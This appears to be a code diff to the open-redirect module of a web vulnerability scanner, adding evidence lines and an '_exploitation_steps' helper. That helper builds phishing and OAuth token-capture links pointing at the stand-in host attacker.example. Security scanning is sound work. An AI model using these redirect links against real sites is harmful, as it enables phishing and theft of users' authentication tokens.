@@ -20,7 +20,7 @@ import httpx
 from loguru import logger
 
 from scanner.engine import Finding, Severity, ScanEngine
-from scanner.vulns._common import Injector, is_safe_mode, iter_injectors
+from scanner.vulns._common import Injector, evidence, is_safe_mode, iter_injectors
 
 MODULE = "open_redirect"
 
@@ -46,7 +46,8 @@ def _redirects_to(resp: httpx.Response, sentinel_host: str) -> str | None:
     return None
 
 
-def _finding(inj: Injector, payload: str, mechanism: str) -> Finding:
+def _finding(inj: Injector, payload: str, mechanism: str,
+             proof_lines: list[str] | None = None) -> Finding:
     proof_url = inj.proof(payload) if inj.proof else None
     auth = any(h in inj.param.lower() for h in _AUTH_HINTS)
     return Finding(
@@ -59,8 +60,23 @@ def _finding(inj: Injector, payload: str, mechanism: str) -> Finding:
         recommendation=("Do not redirect to user-supplied URLs. Use an allowlist of internal paths, or "
                         "map an opaque token to a fixed destination server-side."),
         raw={"location": inj.label, "parameter": inj.param, "payload": payload,
-             "mechanism": mechanism, "proof_url": proof_url, "confidence": "high"},
+             "mechanism": mechanism, "proof_url": proof_url, "confidence": "high",
+             "evidence": proof_lines or [f"injected into {inj.label}: {payload}"],
+             "exploitation": _exploitation_steps(inj)},
     )
+
+
+def _exploitation_steps(inj: Injector) -> list[dict]:
+    """Weaponise a confirmed open redirect for phishing / OAuth token theft. Authorised targets only."""
+    if inj.proof is None:
+        return [{"step": 1, "description": "Set the redirect target to an attacker-controlled URL.",
+                 "command": f"<set {inj.param} to https://attacker.example/login>"}]
+    return [
+        {"step": 1, "description": "Phishing: a link on the trusted domain that lands on the attacker site.",
+         "command": inj.proof("https://attacker.example/login")},
+        {"step": 2, "description": "Abuse OAuth/SSO redirect allowlists to capture the auth code/token.",
+         "command": inj.proof("https://attacker.example/oauth-callback")},
+    ]
 
 
 def _test(engine: ScanEngine, inj: Injector) -> Finding | None:
@@ -75,7 +91,11 @@ def _test(engine: ScanEngine, inj: Injector) -> Finding | None:
         logger.debug(f"open_redirect: {url} → {exc}")
         return None
     mechanism = _redirects_to(resp, host)
-    return _finding(inj, payload, mechanism) if mechanism else None
+    if not mechanism:
+        return None
+    proof_lines = evidence(inj, payload, resp,
+                           indicator=f"redirects to attacker host via {mechanism} → {host}")
+    return _finding(inj, payload, mechanism, proof_lines)
 
 
 def run(engine: ScanEngine) -> list[Finding]:
